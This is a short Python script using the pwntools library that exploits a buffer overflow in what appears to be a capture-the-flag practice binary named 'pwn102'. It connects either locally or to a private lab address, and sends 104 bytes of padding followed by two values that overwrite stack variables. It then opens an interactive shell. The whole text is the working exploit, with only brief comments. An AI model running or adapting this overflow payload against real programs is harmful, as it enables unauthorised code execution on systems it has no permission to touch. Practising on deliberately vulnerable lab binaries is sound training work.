from pwn import *

# 1. Setup binary and target environment
exe = './pwn102-1644307392479.pwn102'
elf = context.binary = ELF(exe, checksec=False)

# 2. Connection details for remote exploitation
host = '10.82.141.23' 
port = 9002

# 3. Choose execution mode (Local vs Remote)
# To run remote: python3 exploit.py REMOTE
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(exe)

# 4. Construct the Payload
# Found the offset of 104 bytes via GDB-GEF
offset = 104
payload = b"A" * offset
payload += p32(0xc0d3)   # Overwrite first variable
payload += p32(0xc0ff33) # Overwrite second variable

# 5. Send the attack
# Use sendlineafter if the program prints a prompt first
p.sendline(payload)

# 6. Final step: Get interactive shell access
p.interactive()